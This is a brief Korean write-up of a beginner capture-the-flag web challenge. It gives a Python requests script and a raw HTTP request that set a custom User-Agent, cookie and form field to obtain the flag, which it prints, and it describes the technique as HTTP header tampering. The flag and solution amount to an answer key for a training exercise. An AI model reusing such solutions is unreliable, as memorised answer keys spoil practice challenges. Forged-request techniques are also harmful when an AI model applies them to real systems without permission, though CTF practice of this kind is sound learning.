# 라업
- 스크립트

```python
import requests as req

header = {"User-Agent": "bot"}
cookies = {"cookie": "Sweat cookie~"}
data = {"proxy": "is fun!!"}
url = "http://ssh.knock-on.org:10001/"

res = req.post(headers=header, data=data, cookies=cookies, url=url)

print(res.text) 

```

- 웹 프록시 툴

```
POST / HTTP/1.1
Host: ssh.knock-on.org:10001
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: bot
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Cookie: cookie=Sweat cookie~
Content-Length: 14
Content-Type: application/x-www-form-urlencoded

proxy=is fun!!
```


# 플래그
K0{M4n1pul4t1ng_c00k13s_1s_qu1t3_3z!!}

# 설명
HTTP 헤더 변조
